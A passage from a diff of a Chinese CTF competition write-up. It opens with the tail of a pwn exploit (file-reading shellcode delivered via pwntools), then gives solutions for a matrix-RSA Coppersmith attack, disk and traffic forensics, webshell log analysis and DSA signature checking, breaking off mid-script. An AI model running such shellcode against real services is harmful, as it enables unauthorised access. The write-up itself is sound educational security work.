+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rsi, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s1">    xor edx, edx
+</span></span></span><span class="line"><span class="cl"><span class="s1">    xor r10, r10
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push SYS_openat
+</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdi, 1
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rsi, 3
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push 0
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdx, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r10, 0x100
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push SYS_sendfile
+</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#bug()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;MADE IN HEAVEN !!!!!!!!!!!!!!!!&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h1 id="crypto">
+<a class="header-anchor" href="#crypto"></a>
+Crypto
+</h1><h2 id="matrixrsa">
+<a class="header-anchor" href="#matrixrsa"></a>
+matrixRSA
+</h2><p>题目实现了矩阵上的RSA，给出了p的高位以及加密后的矩阵，第一部分直接对p高位打copper，还原p</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">gmpy2</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="mi">9707529668721508094878754383636813058761407528950189013789315732447048631740849315894253576415843631107370002912949379757275</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">&lt;&lt;</span><span class="mi">100</span>
+</span></span><span class="line"><span class="cl"><span class="n">PR</span><span class="o">.&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">Zmod</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="n">p</span><span class="o">+</span><span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">small_roots</span><span class="p">(</span><span class="n">X</span><span class="o">=</span><span class="mi">2</span><span class="o">^</span><span class="mi">100</span><span class="p">,</span> <span class="n">beta</span><span class="o">=</span><span class="mf">0.4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">res</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">12305755811288164655681709252717258015229295989302934566212712319314835335461946241491177972870130171728224502716603340551354171940107285908105124549960063
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span></code></pre></div><p>到现在的话我们就顺利的分解了n，接下来需要求解私钥，矩阵上的RSA的phi和正常的不太一样，它的形式为</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154313929-1899459675.png" alt="image-20250303154309619"></p>
+<p>那么接下来求解私钥然后对矩阵整体进行d次幂，然后遍历每行每列输出flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sage.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="mi">12305755811288164655681709252717258015229295989302934566212712319314835335461946241491177972870130171728224502716603340551354171940107285908105124549960063</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009</span>
+</span></span><span class="line"><span class="cl"><span class="n">C</span> <span class="o">=</span> <span class="n">Matrix</span><span class="p">(</span><span class="n">Zmod</span><span class="p">(</span><span class="n">n</span><span class="p">),</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="mi">130700952989014311434434028098810412089294728270156705618326733322297465714495704072159530618655340096705383710304658044991149662060657745933090473082775425812641300964472543605460360640675949447837208449794830578184968528547366608180085787382376536622136035364815331037493098283462540849880674541138443271941</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">     <span class="mi">71108771421281691064141020659106224750236412635914570166893031318860027728093402453305986361330527563506168063047627979831630830003190075818824767924892107148560048725155587353683119195901991465464478196049173060097561821877061015587704803006499153902855903286456023726638247758665778434728734461065079337757</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">     <span class="mi">67999998657112350704927993584783146575182096185020115836188544590466205688442741039622382576899587857972463337900200038021257164640987281308471100297698062626107380871262596623736773815445544153508352926374272336154553916204320257697068627063236060520725376727528604938949588845448940836430120015498687885615</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="mi">23893343854815011808020457237095285782125931083991537368666368653089096539223297567339111502968295914745423286070638369517207554770793304994639155083818859208362057394004419565231389473766857235749279110546079776040193183912062870294579472815588333047561915280189529367474392709554971446978468118280633281993</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">     <span class="mi">9711323829269829751519177755915164402658693668631868499383945203627197171508441332211907278473276713066275283973856513580205808517918096017699122954464305556795300874005627001464297760413897074044080665941802588680926430030715299713241442313300920463145903399054123967914968894345491958980945927764454159601</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">     <span class="mi">44904507975955275578858125671789564568591470104141872573541481508697254621798834910263012676346204850278744732796211742615531019931085695420000582627144871996018850098958417750918177991375489106531511894991744745328626887250694950153424439172667977623425955725695498585224383607063387876414273539268016177401</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="mi">67805732998935098446255672500407441801838056284635701147853683333480924477835278030145327818330916280792499177503535618310624546400536573924729837478349680007368781306805363621196573313903080315513952415535369016620873765493531188596985587834408434835281527678166509365418905214174034794683785063802543354572</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">     <span class="mi">13486048723056269216825615499052563411132892702727634833280269923882908676944418624902325737619945647093190397919828623788245644333036340084254490542292357044974139884304715033710988658109160936809398722070125690919829906642273377982021120160702344103998315875166038849942426382506293976662337161520494820727</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">     <span class="mi">95932690738697024519546289135992512776877884741458439242887603021792409575448192508456813215486904392440772808083658410285088451086298418303987628634150431725794904656250453314950126433260613949819432633322599879072805834951478466009343397728711205498602927752917834774516505262381463414617797291857077444676</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">q</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="n">p</span>
+</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">^</span><span class="mi">2</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">p</span><span class="o">^</span><span class="mi">2</span><span class="o">-</span><span class="n">p</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">^</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">^</span><span class="mi">2</span> <span class="o">-</span> <span class="n">q</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">M</span> <span class="o">=</span> <span class="n">C</span> <span class="o">**</span> <span class="n">d</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">M</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">row</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">value</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></div><h1 id="misc">
+<a class="header-anchor" href="#misc"></a>
+Misc
+</h1><h2 id="糟糕的磁盘">
+<a class="header-anchor" href="#%e7%b3%9f%e7%b3%95%e7%9a%84%e7%a3%81%e7%9b%98"></a>
+糟糕的磁盘
+</h2><p>用取证大师进行取证，发现RAID-0</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154327149-1648019519.png" alt="image-20250303154323167"></p>
+<p>加密的文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154331875-1070210975.png" alt="image-20250303154327980"></p>
+<p>key是key.png</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154340469-492426724.png" alt="image-20250303154335594"></p>
+<p>用veracrypt挂载</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154345249-966731448.png" alt="image-20250303154341278"></p>
+<p>得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154349814-2057841595.png" alt="image-20250303154345984"></p>
+<h1 id="iot">
+<a class="header-anchor" href="#iot"></a>
+IoT
+</h1><h2 id="blink">
+<a class="header-anchor" href="#blink"></a>
+blink
+</h2><p>binwalk提不了，直接一坨放ida看了，esp的bin文件</p>
+<p>看了很久的逻辑没找到关键逻辑，直接shift 12搜搜字符串，看到可疑字符串如下，交了即是flag</p>
+<p>rtosandmorseisveryeasyhahhaha</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154356997-1326263203.png" alt="image-20250303154352848"></p>
+<h2 id="sharkp">
+<a class="header-anchor" href="#sharkp"></a>
+sharkp
+</h2><p>分析流量发现接口大概确定是这下面两个</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154407709-566972928.png" alt="image-20250303154403877"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154412121-1475758605.png" alt="image-20250303154407995"></p>
+<p>在后面又发现了可执行文件保存下来</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154417349-1788202840.png" alt="image-20250303154413349"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154423129-879773282.png" alt="image-20250303154418814"></p>
+<p>丢进沙箱（安恒沙箱真好用！！！）发现IP</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154429423-1382535449.png" alt="image-20250303154424949"></p>
+<p>最后提交成功 <code>setConfigUpload_115.195.88.161</code></p>
+<h1 id="ds">
+<a class="header-anchor" href="#ds"></a>
+DS
+</h1><h2 id="easydatalog">
+<a class="header-anchor" href="#easydatalog"></a>
+easydatalog
+</h2><p>分析error.log，有上马的痕迹</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154446106-1498889270.png" alt="image-20250303154442157"></p>
+<p>这里有上传图片的痕迹，提取出来</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154451060-759323777.png" alt="image-20250303154446899"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154455225-372869484.png" alt="image-20250303154451067"></p>
+<p>puzzlesolver一把梭，发现密码 <code>dataPersonPass123987</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154501215-361879772.png" alt="image-20250303154457085"></p>
+<p>下面有上传zip的痕迹</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154505841-1294426667.png" alt="image-20250303154501750"></p>
+<p>拼接的zip，提出来</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154510048-447904192.png" alt="image-20250303154505902"></p>
+<p>解压zip获得 <code>data.csv</code></p>
+<p>但是乱码改成txt得到张三信息，即 <code>30601319731003117X_79159498824</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154515316-1604205721.png" alt="image-20250303154511212"></p>
+<h2 id="dsasignaturedata">
+<a class="header-anchor" href="#dsasignaturedata"></a>
+DSASignatureData
+</h2><p>本题目要求对数据进行验签，分析数据包，在数据包中是个人基础信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154524148-1242643115.png" alt="image-20250303154520184"></p>
+<p>那就先提取数据，然后按照规定进行验证</p>
+<p>先把多余的流量去掉，只保留传的json</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154530990-1283830734.png" alt="image-20250303154526899"></p>
+<p>然后用tshark，提取用户信息</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tshark -r filter1.pcapng -T fields -e http.request.uri.query.parameter -e json.object -E <span class="nv">separator</span><span class="o">=</span>, &gt; extracted_data.txt
+</span></span></code></pre></div><p>然后整理得到这个csv</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154538186-557907021.png" alt="image-20250303154534134"></p>
+<p>然后按照规则，验证签名，然后得到错误结果</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">csv</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">DSA</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Signature</span> <span class="kn">import</span> <span class="n">DSS</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">SHA256</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">public_keys</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">public_folder</span> <span class="o">=</span> <span class="s1">&#39;public&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">public_folder</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">filename</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;.pem&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">userid</span> <span class="o">=</span> <span class="n">filename</span><span class="p">[</span><span class="mi">7</span><span class="p">:</span><span class="mi">11</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">public_folder</span><span class="p">,</span> <span class="n">filename</span><span class="p">),</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">key_file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">public_key</span> <span class="o">=</span> <span class="n">DSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">key_file</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="n">public_keys</span><span class="p">[</span><span class="n">userid</span><span class="p">]</span> <span class="o">=</span> <span class="n">public_key</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sign_data_file</span> <span class="o">=</span> <span class="s1">&#39;data-sign.csv&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sign_data_file</span><span class="p">,</span> <span class="n">newline</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">csvfile</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">reader</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">DictReader</span><span class="p">(</span><span class="n">csvfile</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">altered_data</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">reader</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">userid</span> <span class="o">=</span> <span class="n">row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">name_signature</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">row</span><span class="p">[</span><span class="s1">&#39;name_signature&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">idcard_signature</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">row</span><span class="p">[</span><span class="s1">&#39;idcard_signature&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">phone_signature</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">row</span><span class="p">[</span><span class="s1">&#39;phone_signature&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">original_data_file</span> <span class="o">=</span> <span class="s1">&#39;extracted_data.csv&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">original_data_file</span><span class="p">,</span> <span class="n">newline</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8-sig&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">original_csvfile</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">original_reader</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">DictReader</span><span class="p">(</span><span class="n">original_csvfile</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">original_row</span> <span class="ow">in</span> <span class="n">original_reader</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">original_row</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="n">userid</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">data_str</span> <span class="o">=</span> <span class="n">original_row</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">data_dict</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data_str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">name</span> <span class="o">=</span> <span class="n">data_dict</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;unicode_escape&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public_key</span> <span class="o">=</span> <span class="n">public_keys</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">userid</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">public_key</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">signer</span> <span class="o">=</span> <span class="n">DSS</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">public_key</span><span class="p">,</span> <span class="s1">&#39;fips-186-3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">name_hash</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">name</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">signer</span><span class="o">.</span><span class="n">verify</span><span class="p">(</span><span class="n">name_hash</span><span class="p">,</span> <span class="n">name_signature</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;用户 </span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="s2"> 的 name 验证通过&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;用户 </span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="s2"> 的 name 验证失败&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">altered_data</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;userid&#39;</span><span class="p">:</span> <span class="n">userid</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;idcard&#39;</span><span class="p">:</span> <span class="n">data_dict</span><span class="p">[</span><span class="s1">&#39;idcard&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;phone&#39;</span><span class="p">:</span> <span class="n">data_dict</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;error_field&#39;</span><span class="p">:</span> <span class="s1">&#39;name&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">idcard_hash</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">data_dict</span><span class="p">[</span><span class="s1">&#39;idcard&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">signer</span><span class="o">.</span><span class="n">verify</span><span class="p">(</span><span class="n">idcard_hash</span><span class="p">,</span> <span class="n">idcard_signature</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;用户 </span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="s2"> 的 idcard 验证通过&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;用户 </span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="s2"> 的 idcard 验证失败&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">altered_data</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;userid&#39;</span><span class="p">:</span> <span class="n">userid</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;idcard&#39;</span><span class="p">:</span> <span class="n">data_dict</span><span class="p">[</span><span class="s1">&#39;idcard&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;phone&#39;</span><span class="p">:</span> <span class="n">data_dict</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;error_field&#39;</span><span class="p">:</span> <span class="s1">&#39;idcard&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">phone_hash</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">data_dict</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">signer</span><span class="o">.</span><span class="n">verify</span><span class="p">(</span><span class="n">phone_hash</span><span class="p">,</span> <span class="n">phone_signature</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;用户 </span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="s2"> 的 phone 验证通过&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;用户 </span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="s2"> 的 phone 验证失败&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">altered_data</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
